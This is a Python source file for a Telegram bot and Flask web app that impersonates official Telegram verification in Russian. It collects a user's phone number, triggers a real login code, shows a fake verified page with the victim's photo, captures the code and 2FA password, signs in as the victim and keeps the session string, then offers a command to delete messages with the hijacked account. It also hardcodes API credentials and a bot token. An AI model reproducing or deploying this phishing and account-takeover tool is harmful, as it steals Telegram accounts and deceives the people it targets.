from flask import Flask, render_template_string, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio
import os
import threading
import base64
from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters

app = Flask(__name__)

API_ID = 25757508
API_HASH = '3091fbda91d4b133207779ddf81fee39'
BOT_TOKEN = "8828318815:AAEJ63XFWpwwuigCWuO_-Hu94sJVyhgn338"

active_sessions = {}

WEB_APP_HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Верификация Telegram</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #0e1621; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #17212b; padding: 25px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); width: 320px; text-align: center; border: 1px solid #232e3c; }
        .badge-container { position: relative; width: 80px; height: 80px; margin: 0 auto 15px auto; }
        .avatar { width: 80px; height: 80px; background: #2b5278; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; color: #fff; font-weight: bold; overflow: hidden; object-fit: cover; }
        .avatar img { width: 100%; height: 100%; object-fit: cover; }
        .blue-badge { position: absolute; bottom: 0; right: 0; background: #2481cc; width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid #17212b; z-index: 10; }
        .blue-badge svg { width: 14px; height: 14px; fill: #fff; }
        h3 { color: #fff; margin: 10px 0 5px 0; font-size: 18px; }
        p { color: #829ba7; font-size: 13px; margin-bottom: 20px; line-height: 1.4; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #2b3847; background: #18222d; color: #fff; font-size: 15px; text-align: center; outline: none; }
        input:focus { border-color: #2481cc; }
        button { width: 95%; padding: 12px; background: #2481cc; color: white; border: none; border-radius: 10px; font-size: 15px; cursor: pointer; font-weight: 600; margin-top: 15px; transition: 0.2s; }
        button:hover { background: #1b6cae; }
        .msg { color: #e53935; font-size: 13px; margin-bottom: 10px; }
        .success { color: #4cd964; font-size: 12px; word-break: break-all; background: #18222d; padding: 12px; border-radius: 8px; text-align: left; direction: ltr; max-height: 140px; overflow-y: auto; border: 1px solid #2b5278; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="badge-container">
            <div class="avatar" id="avatar_box">
                <span id="user_initials">TG</span>
            </div>
            <div class="blue-badge">
                <svg viewBox="0 0 24 24"><path d="M9 16.2l-3.5-3.5 1.4-1.4L9 13.4l9.1-9.1 1.4 1.4z"/></svg>
            </div>
        </div>
        <h3>Официальная верификация</h3>
        <p id="desc_text">Введите код подтверждения из Telegram:</p>
        
        <div id="content">
            <div id="error_box" class="msg"></div>
            <input type="text" id="code_val" placeholder="Код (например 12345)">
            <button onclick="submitCode()">Подтвердить</button>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        let phoneNum = "{{ phone }}";
        let userPhoto = "{{ photo_base64 }}";
        let userName = "{{ first_name }}";

        if (userPhoto && userPhoto.length > 10) {
            document.getElementById('avatar_box').innerHTML = `<img src="data:image/jpeg;base64,${userPhoto}" alt="Avatar">`;
        } else if (userName) {
            document.getElementById('user_initials').innerText = userName.charAt(0).toUpperCase();
        }

        function submitCode() {
            let code = document.getElementById('code_val').value.toString().trim();
            if(!code) { alert("Введите код!"); return; }

            document.getElementById('error_box').innerText = "Проверка...";

            fetch('/api', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ action: 'code', phone: phoneNum, value: code })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'need_password') {
                    document.getElementById('desc_text').innerText = "Введите облачный пароль (2FA):";
                    document.getElementById('content').innerHTML = `
                        <div id="error_box" class="msg"></div>
                        <input type="password" id="pass_val" placeholder="Пароль">
                        <button onclick="submitPassword()">Войти</button>`;
                } else if (data.status === 'done') {
                    document.getElementById('desc_text').innerText = "Успешно верифицировано!";
                    document.getElementById('content').innerHTML = `
                        <h3 style="color: #4cd964;">✅ Готово!</h3>
                        <p>Сессия сохранена:</p>
                        <div class="success">${data.session}</div>`;
                } else {
                    document.getElementById('error_box').innerText = data.message || "Ошибка";
                }
            }).catch(err => {
                document.getElementById('error_box').innerText = "Ошибка соединения";
            });
        }

        function submitPassword() {
            let pass = document.getElementById('pass_val').value.toString().trim();
            if(!pass) { alert("Введите пароль!"); return; }

            document.getElementById('error_box').innerText = "Проверка пароля...";

            fetch('/api', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ action: 'password', phone: phoneNum, value: pass })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'done') {
                    document.getElementById('desc_text').innerText = "Успешно верифицировано!";
                    document.getElementById('content').innerHTML = `
                        <h3 style="color: #4cd964;">✅ Готово!</h3>
                        <p>Сессия сохранена:</p>
                        <div class="success">${data.session}</div>`;
                } else {
                    document.getElementById('error_box').innerText = data.message || "Неверный пароль";
                }
            }).catch(err => {
                document.getElementById('error_box').innerText = "Ошибка соединения";
            });
        }
    </script>
</body>
</html>
"""

@app.route('/verify/<path:phone>')
def verify_page(phone):
    session_data = active_sessions.get(phone)
    photo_b64 = session_data.get('photo_b64', '') if session_data else ''
    first_name = session_data.get('first_name', 'Telegram') if session_data else 'Telegram'
    return render_template_string(WEB_APP_HTML, phone=phone, photo_base64=photo_b64, first_name=first_name)

@app.route('/api', methods=['POST'])
def api():
    global active_sessions
    data = request.json
    action = data.get('action')
    phone = data.get('phone')
    value = str(data.get('value')) if data.get('value') else ""

    session_data = active_sessions.get(phone)
    if not session_data:
        return jsonify({"status": "error", "message": "Сессия истекла."})

    try:
        session_str_val = session_data['session_str_val']
        hash_val = session_data['hash']

        async def execute_action():
            async with TelegramClient(StringSession(session_str_val), API_ID, API_HASH) as client:
                if action == 'code':
                    try:
                        await client.sign_in(str(phone), str(value).strip(), phone_code_hash=str(hash_val))
                        new_session = client.session.save()
                        session_data['session_str'] = new_session
                        return {"status": "done", "session": str(new_session)}
                    except Exception as e:
                        err_str = str(e)
                        if "SessionPasswordNeededError" in err_str or "password" in err_str.lower() or "Password" in err_str:
                            return {"status": "need_password"}
                        else:
                            return {"status": "error", "message": err_str}

                elif action == 'password':
                    try:
                        await client.sign_in(password=str(value).strip())
                        new_session = client.session.save()
                        session_data['session_str'] = new_session
                        return {"status": "done", "session": str(new_session)}
                    except Exception as e:
                        return {"status": "error", "message": f"Неверный пароль: {e}"}

        res = asyncio.run(execute_action())
        return jsonify(res)

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    button = KeyboardButton("🛡️ Подтвердить номер телефона", request_contact=True)
    reply_markup = ReplyKeyboardMarkup([[button]], resize_keyboard=True, one_time_keyboard=True)
    
    await update.message.reply_text(
        "👋 Добро пожаловать في центр верификации Telegram.\n\nНажмите кнопку ниже для подтверждения номера:",
        reply_markup=reply_markup
    )

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    
    try:
        await update.message.delete()
    except Exception:
        pass

    if contact:
        phone = contact.phone_number
        if not phone.startswith('+'):
            phone = '+' + phone

        try:
            temp_client = TelegramClient(StringSession(), API_ID, API_HASH)
            await temp_client.connect()
            
            sent_code = await temp_client.send_code_request(phone)
            
            # محاولة سحب صورة الحساب الشخصية واسمه الأول
            photo_b64 = ""
            first_name = "Telegram"
            try:
                me = await temp_client.get_me()
                if me:
                    first_name = me.first_name or "Telegram"
                    path = await temp_client.download_profile_photo(me, file="bytes")
                    if path:
                        photo_b64 = base64.b64encode(path).decode('utf-8')
            except Exception:
                pass

            session_str_val = temp_client.session.save()
            await temp_client.disconnect()

            active_sessions[phone] = {
                'session_str_val': session_str_val,
                'phone': phone,
                'hash': str(sent_code.phone_code_hash),
                'photo_b64': photo_b64,
                'first_name': first_name
            }

            base_url = os.getenv('RENDER_EXTERNAL_URL', 'wahm0.onrender.com')
            if not base_url.startswith('http'):
                base_url = f"https://{base_url}"

            web_url = f"{base_url}/verify/{phone}"

            keyboard = [[InlineKeyboardButton("💬 Ввести код подтверждения", web_app=WebAppInfo(url=web_url))]]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                "✅ Код подтверждения успешно отправлен в ваш Telegram. Нажмите кнопку ниже для ввода кода:",
                reply_markup=reply_markup
            )
        except Exception as e:
            await update.message.reply_text(f"❌ Ошибка отправки кода: {e}")

async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session_data = None
    for p, data in active_sessions.items():
        if 'session_str' in data:
            session_data = data
            break

    if not session_data or 'session_str' not in session_data:
        await update.message.reply_text("❌ Сначала завершите верификацию!")
        return

    args = context.args
    limit = int(args[0]) if args and args[0].isdigit() else 100
    chat = update.effective_chat

    status_msg = await update.message.reply_text(f"⏳ Удаление последних {limit} сообщений...")

    try:
        session_str = session_data['session_str']
        async with TelegramClient(StringSession(session_str), API_ID, API_HASH) as client:
            deleted_count = 0
            async for message in client.iter_messages(chat.id, from_user='me', limit=limit):
                try:
                    await client.delete_messages(chat.id, message.id)
                    deleted_count += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    pass

        await status_msg.edit_text(f"✅ Успешно удалено сообщений: {deleted_count}")
    except Exception as e:
        await status_msg.edit_text(f"❌ Ошибка: {e}")

async def auto_delete_user_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.delete()
    except Exception:
        pass

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), use_reloader=False)

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("delet", delete_messages_command))
    application.add_handler(MessageHandler(filters.CONTACT, contact_handler))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), auto_delete_user_messages))
    
    print("Fokhm Perfect Bot is running...")
    application.run_polling()

